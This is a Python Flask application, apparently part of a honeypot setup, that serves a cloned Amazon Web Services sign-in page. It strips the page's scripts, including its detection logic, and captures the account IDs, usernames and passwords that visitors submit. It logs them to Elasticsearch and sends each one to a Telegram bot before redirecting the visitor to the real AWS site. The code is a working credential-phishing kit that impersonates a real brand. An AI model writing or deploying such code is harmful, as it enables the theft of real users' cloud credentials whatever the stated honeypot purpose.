from flask import Flask, request, send_from_directory, Response, redirect
import os
import re
import requests
from datetime import datetime
from dotenv import load_dotenv

load_dotenv('/data/tpot-intel/.env')
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
ES_URL = "http://localhost:64298"

app = Flask(__name__)

FAKE_LOGIN_DIR = '/data/tpot-intel/fake-login'
STATIC_DIR = '/data/tpot-intel/fake-login/static'
HTML_FILE = 'Amazon Web Services Sign-In.html'

THANKYOU = '''<!DOCTYPE html>
<html>
<head>
<title>Amazon Web Services Sign-In</title>
<style>
  body { font-family: Arial, sans-serif; background: #232f3e;
         display: flex; align-items: center; justify-content: center;
         min-height: 100vh; }
  .card { background: white; padding: 40px; border-radius: 4px;
          text-align: center; max-width: 400px; }
  .spinner {
    border: 3px solid #f3f3f3; border-top: 3px solid #ec7211;
    border-radius: 50%; width: 30px; height: 30px;
    animation: spin 1s linear infinite; margin: 20px auto;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  h2 { color: #16191f; margin-bottom: 12px; }
  p { color: #687078; font-size: 14px; }
</style>
</head>
<body>
  <div class="card">
    <div class="spinner"></div>
    <h2>Signing you in...</h2>
    <p>Please wait while we verify your credentials.</p>
  </div>
  <script>setTimeout(function(){ window.location.href="https://aws.amazon.com"; }, 3000);</script>
</body>
</html>'''

def log_to_es(data):
    try:
        requests.post(
            f"{ES_URL}/tpot-honeycreds/_doc",
            json=data,
            headers={"Content-Type": "application/json"},
            timeout=5
        )
    except:
        pass

def send_telegram(data):
    try:
        msg = f"""🎣 <b>CREDENTIAL CAPTURED</b>

🌐 <b>IP:</b> <code>{data['src_ip']}</code>
🏢 <b>Account:</b> <code>{data.get('account','')}</code>
👤 <b>Username:</b> <code>{data.get('username','')}</code>
🔑 <b>Password:</b> <code>{data.get('password','')}</code>
🌍 <b>Country:</b> {data.get('country','Unknown')}
🖥️ <b>UA:</b> {data.get('user_agent','')[:80]}
⏰ {data['timestamp']}"""
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"},
            timeout=10
        )
    except:
        pass

def get_country(ip):
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/country", timeout=5)
        return r.text.strip()
    except:
        return "Unknown"

def inject_capture_form(html):
    """Inject credential capture and strip AWS redirect JS"""
    # Fix form action
    html = re.sub(
        r'<form[^>]*>',
        '<form method="POST" action="/login">',
        html,
        count=1
    )
    # Fix input names
    html = re.sub(r'name="accountId"', 'name="account"', html)
    html = re.sub(r'name="username"', 'name="username"', html)
    html = re.sub(r'name="password"', 'name="password"', html)
    
    # Remove all external JS script tags that cause redirects
    html = re.sub(r'<script[^>]*src=["\'][^"\']*["\'][^>]*></script>', '', html)
    
    # Remove inline scripts that contain redirect/detection logic
    html = re.sub(r'<script[^>]*>.*?</script>', '', html, flags=re.DOTALL)
    
    return html
@app.route('/')
def index():
    """Serve real AWS login page with capture injected"""
    try:
        with open(os.path.join(FAKE_LOGIN_DIR, HTML_FILE), 'r', encoding='utf-8') as f:
            html = f.read()
        # Fix static asset paths
        html = html.replace(
            'Amazon Web Services Sign-In_files/',
            '/static/'
        )
        html = inject_capture_form(html)
        return Response(html, mimetype='text/html')
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/static/<path:filename>')
def static_files(filename):
    """Serve static assets"""
    return send_from_directory(STATIC_DIR, filename)

@app.route('/login', methods=['POST'])
def login():
    """Capture submitted credentials"""
    src_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    data = {
        '@timestamp': datetime.utcnow().isoformat(),
        'src_ip': src_ip,
        'account': request.form.get('account', ''),
        'username': request.form.get('username', ''),
        'password': request.form.get('password', ''),
        'user_agent': request.headers.get('User-Agent', ''),
        'country': get_country(src_ip),
        'honeypot': 'fake-aws-login',
        'type': 'credential_capture',
        'timestamp': datetime.utcnow().isoformat()
    }

    print(f"[CAPTURE] {src_ip} | {data['account']} | {data['username']} | {data['password']}")
    log_to_es(data)
    send_telegram(data)
    return Response(THANKYOU, mimetype='text/html')

# ─── Scanner traps ───
@app.route('/console')
@app.route('/admin')
@app.route('/wp-admin')
@app.route('/phpmyadmin')
def scanner_trap():
    src_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    log_to_es({
        '@timestamp': datetime.utcnow().isoformat(),
        'src_ip': src_ip,
        'path': request.path,
        'user_agent': request.headers.get('User-Agent', ''),
        'honeypot': 'fake-aws-login',
        'type': 'scanner_probe'
    })
    return redirect('/')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888, debug=False)
